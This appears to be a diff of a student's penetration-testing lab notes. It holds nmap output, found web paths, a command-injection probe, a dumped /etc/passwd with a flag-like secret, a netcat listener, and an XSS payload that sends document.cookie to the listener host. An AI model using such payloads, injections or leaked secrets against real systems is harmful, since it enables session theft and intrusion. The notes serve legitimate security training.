@@ -9,20 +9,26 @@ PORT     STATE SERVICE
 |   /css/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
 |   /images/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
 |_  /uploads/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
+/net_test
+/Contract_bids.html
+/TT
 4444/tcp open  krb524
 
-http://127.0.0.1:3333/images/
 
+; ls /var/ww/html
+/var/www/html/net_test
+billybob
 
+root:x:0:0:root:/root:/bin/bash
+www-data:x:33:33:www-data:/var/www:/bin/bash
+ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
+billybob:x:1001:1001:you found me QzivT2SHKiSmAoa6xtry:/home/billybob:/bin/bash
 
+/home/romanoff@mi.ru/contracts 
 
+student@lin-ops:~$ nc -lk 10.50.188.39 42069
 
-
-
-
-
-
-
+<script>document.location="http://10.50.188.39:42069/?username=" + document.cookie;</script>
 
 
 
